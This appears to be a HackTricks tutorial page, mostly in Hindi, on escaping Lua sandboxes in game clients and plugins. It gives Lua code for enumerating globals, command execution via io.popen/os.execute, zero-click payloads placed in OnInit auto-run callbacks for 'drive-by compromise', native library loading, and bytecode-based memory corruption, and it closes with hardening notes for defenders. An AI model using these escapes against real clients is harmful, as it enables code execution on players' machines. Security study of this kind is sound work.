# Bypass Lua sandboxes (embedded VMs, game clients)

{{#include ../../../banners/hacktricks-training.md}}

यह पृष्ठ ऐप्लिकेशन में embedded Lua "sandboxes" को enumerate करने और उनसे बाहर निकलने के व्यावहारिक तरीकों को इकट्ठा करता है (विशेषकर game clients, plugins, या in-app scripting engines)। कई engines सीमित Lua environment expose करते हैं, लेकिन शक्तिशाली globals को reachable छोड़ देते हैं जो arbitrary command execution या यहां तक कि native memory corruption की अनुमति देते हैं जब bytecode loaders exposed हों।

मुख्य विचार:
- VM को एक अज्ञात environment मानें: _G को enumerate करें और पता लगाएँ कौन से dangerous primitives reachable हैं।
- जब stdout/print blocked हो, किसी भी in-VM UI/IPC चैनल का output sink के रूप में दुरुपयोग करके परिणाम देखें।
- अगर io/os exposed है, तो अक्सर आपके पास direct command execution होता है (io.popen, os.execute)।
- अगर load/loadstring/loadfile exposed हैं, तो crafted Lua bytecode चलाकर कुछ संस्करणों में memory safety को subvert किया जा सकता है (≤5.1 verifiers bypassable हैं; 5.2 ने verifier हटा दिया), जिससे advanced exploitation संभव होता है।

## Sandboxed environment को enumerate करें

- Global environment को dump करके reachable tables/functions का inventory बनाएं:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- यदि print() उपलब्ध नहीं है, तो in-VM channels का पुन: उपयोग करें। MMO housing script VM के उदाहरण में जहाँ chat output केवल sound call के बाद ही काम करता है; निम्नलिखित एक विश्वसनीय output function बनाता है:
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
अपने लक्ष्य के लिए इस पैटर्न को सामान्य करें: कोई भी textbox, toast, logger, या UI callback जो strings स्वीकार करता है, reconnaissance के लिए stdout की तरह कार्य कर सकता है।

## Direct command execution if io/os is exposed

यदि sandbox अभी भी मानक लाइब्रेरी io या os को एक्सपोज़ करता है, तो आपके पास संभवतः immediate command execution है:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
नोट्स:
- निष्पादन client process के भीतर होता है; कई anti-cheat/antidebug परतें जो external debuggers को ब्लॉक करती हैं, in-VM process creation को रोक नहीं पाएंगी।
- यह भी जांचें: package.loadlib (arbitrary DLL/.so loading), require with native modules, LuaJIT's ffi (if present), और debug library (can raise privileges inside the VM).

## Zero-click triggers via auto-run callbacks

If the host application pushes scripts to clients and the VM exposes auto-run hooks (e.g., OnInit/OnLoad/OnEnter), place your payload there for drive-by compromise as soon as the script loads:
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
कोई भी समकक्ष callback (OnLoad, OnEnter, आदि) इस तकनीक को सामान्यीकृत करता है जब scripts स्वतः client पर भेजे और निष्पादित किए जाते हैं।

## Recon के दौरान खोजने के लिए खतरनाक primitives

_G enumeration के दौरान, विशेष रूप से निम्न देखें:
- io, os: io.popen, os.execute, file I/O, env access.
- load, loadstring, loadfile, dofile: source या bytecode को निष्पादित करता है; untrusted bytecode को लोड करने का समर्थन करता है.
- package, package.loadlib, require: dynamic library loading और module surface.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo, and hooks.
- LuaJIT-only: ffi.cdef, ffi.load native code को सीधे call करने के लिए.

यदि पहुँच संभव हो तो न्यूनतम उपयोग के उदाहरण:
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## वैकल्पिक escalation: Lua bytecode loaders का दुरुपयोग

जब load/loadstring/loadfile पहुँच में हों पर io/os प्रतिबंधित हों, तो crafted Lua bytecode का निष्पादन memory disclosure और corruption primitives तक पहुंचा सकता है। मुख्य तथ्य:
- Lua ≤ 5.1 shipped a bytecode verifier that has known bypasses.
- Lua 5.2 removed the verifier entirely (official stance: applications should just reject precompiled chunks), widening the attack surface if bytecode loading is not prohibited.
- Workflows typically: leak pointers via in-VM output, craft bytecode to create type confusions (e.g., around FORLOOP or other opcodes), then pivot to arbitrary read/write or native code execution.

यह रास्ता engine/version-specific है और RE की आवश्यकता होती है। गहराई से जानने के लिए references देखें — exploitation primitives और games में मौजूद example gadgetry के लिए।

## Detection and hardening notes (for defenders)

- Server side: user scripts को reject या rewrite करें; allowlist safe APIs लागू करें; io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi को strip या bind-empty कर दें।
- Client side: Lua को एक minimal _ENV के साथ चलाएँ, bytecode loading को निषिद्ध करें, एक strict bytecode verifier या signature checks पुनः लागू करें, और client process से process creation को ब्लॉक करें।
- Telemetry: script load के तुरंत बाद gameclient → child process creation पर अलर्ट करें; इसे UI/chat/script events के साथ correlate करें।

## References

- [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
